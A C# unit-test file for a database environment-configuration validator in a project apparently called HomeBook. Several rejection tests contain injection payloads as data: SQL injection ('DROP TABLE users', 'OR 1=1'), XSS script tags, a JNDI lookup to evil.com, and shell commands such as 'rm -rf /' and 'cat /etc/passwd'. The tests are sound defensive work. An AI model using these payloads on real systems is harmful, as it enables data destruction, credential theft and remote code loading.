using Homebook.Backend.Core.Setup.Models;
using Homebook.Backend.Core.Setup.Validators;

namespace HomeBook.UnitTests.Backend.Core.Setup.Validators;

[TestFixture]
public class EnvironmentValidatorTests
{
    private EnvironmentValidator _validator;

    [SetUp]
    public void SetUp()
    {
        _validator = new EnvironmentValidator();
    }

    #region Valid Configuration Tests

    [Test]
    public void Validate_CompleteValidConfiguration_ShouldPass()
    {
        // Arrange
        var config = new EnvironmentConfiguration(
            DatabaseHost: "localhost",
            DatabasePort: "5432",
            DatabaseName: "homebook",
            DatabaseUserName: "admin",
            DatabaseUserPassword: "SecurePassword123"
        );

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.ShouldBeEmpty();
    }

    [Test]
    public void Validate_CompleteValidConfigurationWithIPv4_ShouldPass()
    {
        // Arrange
        var config = new EnvironmentConfiguration(
            DatabaseHost: "192.168.1.100",
            DatabasePort: "3306",
            DatabaseName: "my_database",
            DatabaseUserName: "db_user",
            DatabaseUserPassword: "MyPassword456"
        );

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.ShouldBeEmpty();
    }

    [Test]
    public void Validate_CompleteValidConfigurationWithFQDN_ShouldPass()
    {
        // Arrange
        var config = new EnvironmentConfiguration(
            DatabaseHost: "database.example.com",
            DatabasePort: "1521",
            DatabaseName: "production-db",
            DatabaseUserName: "prod.user",
            DatabaseUserPassword: "ComplexPass789"
        );

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.ShouldBeEmpty();
    }

    [Test]
    public void Validate_PartialValidConfiguration_ShouldPass()
    {
        // Arrange
        var config = new EnvironmentConfiguration(
            DatabaseHost: "localhost",
            DatabasePort: null,
            DatabaseName: "testdb",
            DatabaseUserName: null,
            DatabaseUserPassword: "ValidPassword123"
        );

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.ShouldBeEmpty();
    }

    [Test]
    public void Validate_AllNullValues_ShouldPass()
    {
        // Arrange
        var config = new EnvironmentConfiguration(
            DatabaseHost: null,
            DatabasePort: null,
            DatabaseName: null,
            DatabaseUserName: null,
            DatabaseUserPassword: null
        );

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.ShouldBeEmpty();
    }

    [Test]
    public void Validate_EmptyStringValues_ShouldPass()
    {
        // Arrange
        var config = new EnvironmentConfiguration(
            DatabaseHost: "",
            DatabasePort: "",
            DatabaseName: "",
            DatabaseUserName: "",
            DatabaseUserPassword: ""
        );

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.ShouldBeEmpty();
    }

    #endregion

    #region DatabaseHost Tests

    [TestCase("01.1.1.1")]            // Invalid IPv4 (leading zeros) but valid hostname
    [TestCase("192.168.1.1.1")]       // Invalid IPv4 (5 parts) but valid hostname
    [TestCase("300.400.500.600")]     // Invalid IPv4 (all > 255) but valid hostname
    [TestCase("0.0.0.0")]             // Invalid IPv4 (0 not allowed) but valid hostname
    [TestCase("256.1.1.1")]           // Invalid IPv4 (256 > 255) but valid hostname
    [TestCase("1.256.1.1")]           // Invalid IPv4 (256 > 255) but valid hostname
    [TestCase("1.1.256.1")]           // Invalid IPv4 (256 > 255) but valid hostname
    [TestCase("1.1.1.256")]           // Invalid IPv4 (256 > 255) but valid hostname
    [TestCase("127.0.0.1")]           // Valid IPv4
    [TestCase("192.168.1.100")]       // Valid IPv4
    [TestCase("10.0.0.1")]            // Valid IPv4
    [TestCase("255.255.255.255")]     // Valid IPv4
    [TestCase("1.1.1.1")]             // Valid IPv4
    [TestCase("::1")]                 // Valid IPv6
    [TestCase("::")]                  // Valid IPv6
    [TestCase("2001:db8::1")]         // Valid IPv6
    [TestCase("localhost")]           // Valid hostname
    [TestCase("database")]            // Valid hostname
    [TestCase("db.example.com")]      // Valid hostname
    [TestCase("my-server.local")]     // Valid hostname
    [TestCase("test123.domain.org")]  // Valid hostname
    [TestCase("192")]                 // Valid hostname (only numbers)
    [TestCase("123.456")]             // Valid hostname (only numbers with dot)
    [TestCase("192.168.1")]           // Valid hostname (3 parts, not IPv4)
    [TestCase("1.1.1.256")]           // Valid hostname (invalid as IPv4, but valid hostname)
    [TestCase("256.300.400.500")]     // Valid hostname (invalid as IPv4, but valid hostname)
    [TestCase("server-01")]           // Valid hostname with hyphen
    public void Validate_ValidHosts_ShouldPass(string host)
    {
        // Arrange
        var config = new EnvironmentConfiguration(host, null, null, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseHost)).ShouldBeEmpty();
    }

    [TestCase("192.168.1.")]          // Invalid IPv4 (trailing dot) and invalid hostname
    [TestCase(".192.168.1.1")]        // Invalid IPv4 (leading dot) and invalid hostname
    [TestCase("invalid..hostname")]   // Invalid hostname (double dot)
    [TestCase("-invalid")]            // Invalid hostname (starts with hyphen)
    [TestCase("invalid-")]            // Invalid hostname (ends with hyphen)
    [TestCase("inv@lid")]             // Invalid hostname (invalid character)
    [TestCase("host with spaces")]    // Invalid hostname (spaces)
    [TestCase("host;with;semicolons")] // Invalid hostname (semicolons)
    [TestCase("host<script>")]        // Invalid hostname (special characters)
    [TestCase("")]                    // Empty string should be valid due to .When condition
    public void Validate_InvalidHosts_ShouldFail(string host)
    {
        // Arrange
        var config = new EnvironmentConfiguration(host, null, null, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert - Empty string is valid due to .When condition, so handle separately
        if (string.IsNullOrEmpty(host))
        {
            result.IsValid.ShouldBeTrue();
            return;
        }

        result.IsValid.ShouldBeFalse();
        var hostErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseHost));
        hostErrors.ShouldNotBeEmpty();
        hostErrors.First().ErrorMessage.ShouldBe("DatabaseHost must be a valid hostname or IP address");
    }

    #endregion

    #region DatabasePort Tests

    [TestCase("1")]
    [TestCase("80")]
    [TestCase("443")]
    [TestCase("3306")]
    [TestCase("5432")]
    [TestCase("65535")]
    public void Validate_ValidPorts_ShouldPass(string port)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, port, null, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabasePort)).ShouldBeEmpty();
    }

    [TestCase("0")]
    [TestCase("-1")]
    [TestCase("65536")]
    [TestCase("99999")]
    [TestCase("abc")]
    [TestCase("3306;DROP TABLE users;")]
    [TestCase("5432 OR 1=1")]
    public void Validate_InvalidPorts_ShouldFail(string port)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, port, null, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var portErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabasePort));
        portErrors.ShouldNotBeEmpty();
        portErrors.First().ErrorMessage.ShouldBe("DatabasePort must be a valid port number between 1 and 65535");
    }

    #endregion

    #region DatabaseName Tests

    [TestCase("a")]
    [TestCase("database")]
    [TestCase("my_database")]
    [TestCase("test-db")]
    [TestCase("DB123")]
    [TestCase("very_long_database_name_that_is_still_within_the_limit_of_63")]
    public void Validate_ValidDatabaseNames_ShouldPass(string dbName)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, null, dbName, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseName)).ShouldBeEmpty();
    }

    [TestCase("-invalid")]
    [TestCase("invalid-")]
    [TestCase("db with spaces")]
    [TestCase("db@invalid")]
    [TestCase("db;DROP TABLE users;")]
    [TestCase("db'OR'1'='1")]
    [TestCase("db\"injection")]
    [TestCase("db<script>")]
    public void Validate_InvalidDatabaseNames_ShouldFail(string dbName)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, null, dbName, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var dbNameErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseName));
        dbNameErrors.ShouldNotBeEmpty();
        dbNameErrors.First().ErrorMessage.ShouldBe("DatabaseName can only contain alphanumeric characters, underscores and hyphens");
    }

    [Test]
    public void Validate_DatabaseNameTooLong_ShouldFail()
    {
        // Arrange
        var longName = new string('a', 64);
        var config = new EnvironmentConfiguration(null, null, longName, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var dbNameErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseName));
        dbNameErrors.ShouldNotBeEmpty();
        dbNameErrors.Any(e => e.ErrorMessage == "DatabaseName must be between 1 and 63 characters long").ShouldBeTrue();
    }

    #endregion

    #region DatabaseUserName Tests

    [TestCase("a")]
    [TestCase("admin")]
    [TestCase("db_user")]
    [TestCase("test-user")]
    [TestCase("user.name")]
    [TestCase("user123")]
    [TestCase("very_long_username_that_is_still_within_the_limit_of_63_chars")]
    public void Validate_ValidUsernames_ShouldPass(string username)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, null, null, username, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserName)).ShouldBeEmpty();
    }

    [TestCase(".invalid")]
    [TestCase("invalid.")]
    [TestCase("-invalid")]
    [TestCase("invalid-")]
    [TestCase("user with spaces")]
    [TestCase("user@domain")]
    [TestCase("user;DROP TABLE users;")]
    [TestCase("user'OR'1'='1")]
    [TestCase("user\"injection")]
    [TestCase("user<script>")]
    public void Validate_InvalidUsernames_ShouldFail(string username)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, null, null, username, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var usernameErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserName));
        usernameErrors.ShouldNotBeEmpty();
        usernameErrors.First().ErrorMessage.ShouldBe("DatabaseUserName can only contain alphanumeric characters, underscores, dots and hyphens");
    }

    [Test]
    public void Validate_UsernameTooLong_ShouldFail()
    {
        // Arrange
        var longUsername = new string('a', 64);
        var config = new EnvironmentConfiguration(null, null, null, longUsername, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var usernameErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserName));
        usernameErrors.ShouldNotBeEmpty();
        usernameErrors.Any(e => e.ErrorMessage == "DatabaseUserName must be between 1 and 63 characters long").ShouldBeTrue();
    }

    #endregion

    #region DatabasePassword Tests

    [TestCase("password123")]
    [TestCase("MySecurePassword")]
    [TestCase("P@ssw0rd!")]
    [TestCase("VeryLongPasswordThatShouldStillBeValid123")]
    [TestCase("Password_with-underscores")]
    [TestCase("Password123!@#")]
    public void Validate_ValidPasswords_ShouldPass(string password)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, null, null, null, password);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword)).ShouldBeEmpty();
    }

    [TestCase("pass'word")]
    [TestCase("pass\"word")]
    [TestCase("pass;word")]
    [TestCase("pass<word")]
    [TestCase("pass>word")]
    [TestCase("pass&word")]
    [TestCase("pass|word")]
    [TestCase("pass`word")]
    [TestCase("pass$word")]
    [TestCase("'; DROP TABLE users; --")]
    [TestCase("\" OR 1=1 --")]
    [TestCase("<script>alert('xss')</script>")]
    [TestCase("${jndi:ldap://evil.com/a}")]
    [TestCase("|whoami")]
    [TestCase("`rm -rf /`")]
    public void Validate_PasswordsWithDangerousCharacters_ShouldFail(string password)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, null, null, null, password);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var passwordErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword));
        passwordErrors.ShouldNotBeEmpty();
        passwordErrors.First().ErrorMessage.ShouldBe("DatabaseUserPassword contains invalid characters");
    }

    [TestCase("short")]
    [TestCase("1234567")]
    public void Validate_PasswordTooShort_ShouldFail(string password)
    {
        // Arrange
        var config = new EnvironmentConfiguration(null, null, null, null, password);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var passwordErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword));
        passwordErrors.ShouldNotBeEmpty();
        passwordErrors.Any(e => e.ErrorMessage == "DatabaseUserPassword must be at least 8 characters long").ShouldBeTrue();
    }

    [Test]
    public void Validate_EmptyPasswordString_ShouldPass()
    {
        // Empty passwords are allowed due to .When condition
        // Arrange
        var config = new EnvironmentConfiguration(null, null, null, null, "");

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword)).ShouldBeEmpty();
    }

    [Test]
    public void Validate_PasswordWithControlCharacters_ShouldFail()
    {
        // Arrange
        var passwordWithControlChar = "password\x00test";
        var config = new EnvironmentConfiguration(null, null, null, null, passwordWithControlChar);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var passwordErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword));
        passwordErrors.ShouldNotBeEmpty();
        passwordErrors.First().ErrorMessage.ShouldBe("DatabaseUserPassword contains invalid characters");
    }

    #endregion

    #region Complex Injection Attack Tests

    [TestCase("192.168.1.1 OR 1=1", "5432 UNION SELECT", "db\" OR \"1\"=\"1", "user\" OR \"1\"=\"1", "pass\" OR \"1\"=\"1")]
    [TestCase("host<script>alert('xss')</script>", "80<script>", "db<script>", "user<script>", "pass<script>")]
    [TestCase("${jndi:ldap://evil.com}", "8080|whoami", "db`rm -rf /`", "user${PATH}", "pass|cat /etc/passwd")]
    public void Validate_ComplexInjectionAttempts_ShouldFailOnAllFields(string host, string port, string dbName, string username, string password)
    {
        // Arrange
        var config = new EnvironmentConfiguration(host, port, dbName, username, password);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseHost)).ShouldNotBeEmpty();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabasePort)).ShouldNotBeEmpty();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseName)).ShouldNotBeEmpty();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserName)).ShouldNotBeEmpty();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword)).ShouldNotBeEmpty();
    }

    [Test]
    public void Validate_HostnameWithSQLInjection_ShouldFail()
    {
        // This specific case was failing because the hostname regex was too permissive
        // Arrange
        var config = new EnvironmentConfiguration("evil.com'; DROP DATABASE homebook; --", "3306", null, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeFalse();
        var hostErrors = result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseHost));
        hostErrors.ShouldNotBeEmpty();
        hostErrors.First().ErrorMessage.ShouldBe("DatabaseHost must be a valid hostname or IP address");
    }

    #endregion

    #region Edge Cases

    [Test]
    public void Validate_IPv6LocalhostAddresses_ShouldPass()
    {
        // Arrange
        var config = new EnvironmentConfiguration("::1", null, null, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseHost)).ShouldBeEmpty();
    }

    [Test]
    public void Validate_IPv6AllZeros_ShouldPass()
    {
        // Arrange
        var config = new EnvironmentConfiguration("::", null, null, null, null);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseHost)).ShouldBeEmpty();
    }

    [Test]
    public void Validate_MaxLengthValues_ShouldPass()
    {
        // Arrange
        var maxDbName = new string('a', 63);
        var maxUsername = new string('u', 63);
        var config = new EnvironmentConfiguration("localhost", "5432", maxDbName, maxUsername, "ValidPassword123");

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.ShouldBeEmpty();
    }

    [Test]
    public void Validate_PasswordWithAllowedSpecialCharacters_ShouldPass()
    {
        // Arrange
        var password = "P@ssw0rd!#%*+=?^_~()-[]{}";
        var config = new EnvironmentConfiguration(null, null, null, null, password);

        // Act
        var result = _validator.Validate(config);

        // Assert
        result.IsValid.ShouldBeTrue();
        result.Errors.Where(e => e.PropertyName == nameof(EnvironmentConfiguration.DatabaseUserPassword)).ShouldBeEmpty();
    }

    #endregion
}
